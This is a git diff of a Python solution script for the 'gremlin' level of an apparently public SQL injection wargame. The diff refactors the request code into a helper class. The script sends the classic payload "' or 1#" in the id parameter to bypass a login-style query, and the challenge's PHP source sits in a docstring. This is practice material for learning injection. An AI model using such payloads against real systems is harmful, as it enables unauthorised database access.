@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
 import los
 import los_cookies as lc
-from connect import my_request as req
 
 
 def main():
-    '''
+    """
     Gremlin - simple sqli injection
 
     if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
@@ -14,16 +13,19 @@ def main():
     echo "<hr>query : <strong>{$query}</strong><hr><br>";
     $result = @mysqli_fetch_array(mysqli_query($db,$query));
     if($result['id']) solve("gremlin");
-    '''
+    """
 
     url = "https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php"
     cook = lc.check_cookies(url)
+    method = 'get'
+    inj_param = 'id'
+    payload = "' or 1#"
 
-    param = dict(id="' or 1#")
-    response = req.get_request(url, param, cook)
+    p = los.SqlInjection(url, cook, method, inj_param, payload)
+    response = p.my_request()
 
     if 'Clear!' in response:
-        print('GREMLIN Clear!')
+        print('\nGREMLIN Clear!')
 
 
 if __name__ == '__main__':
